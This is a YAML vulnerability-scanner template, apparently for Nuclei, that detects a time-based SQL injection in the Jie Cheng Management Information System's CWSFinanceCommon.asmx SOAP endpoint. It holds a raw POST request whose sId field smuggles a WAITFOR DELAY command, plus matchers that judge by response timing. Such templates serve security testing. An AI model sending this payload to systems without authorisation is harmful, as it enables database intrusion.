folder-6/poc-yaml-jie-cheng-management-information-system-cwsfinancecommon-asmx-sqli.yaml

id: jie-cheng-management-information-system-cwsfinancecommon-asmx-sqli
info:
  name: Jie Cheng Management Information System CWSFinanceCommon.asmx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(5, 10)}}'

http:
  - raw:
      - |
        POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8

        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <GetOSpById xmlns="http://tempuri.org/">
        <sId>1';WAITFOR DELAY '0:0:{{t1}}'--+</sId>
        </GetOSpById>
        </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<GetOSpByIdResult>"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration <= 10"
